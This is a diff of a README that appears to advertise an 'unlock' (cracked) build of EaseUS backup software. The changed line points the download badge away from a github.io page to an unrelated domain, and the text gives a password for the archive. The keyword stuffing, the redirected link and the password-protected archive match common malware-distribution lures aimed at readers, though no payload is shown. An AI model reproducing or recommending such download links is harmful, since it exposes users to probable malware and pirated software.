@@ -74,7 +74,7 @@ no install backup tool, diagnostic easeus interface, backup tool visualizer, gui
 
 ### 📥 Download Package
 
-[![Download Unlock Tool](https://img.shields.io/badge/Download-EaseUS--Local--Suite-blueviolet?style=for-the-badge&logo=windows)](https://easeus-unlock-suite.github.io)
+[![Download Unlock Tool](https://img.shields.io/badge/Download-EaseUS--Local--Suite-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
 
 🗝 Code: `ease_2025_local`  
 📦 Archive includes 5 GUI items  
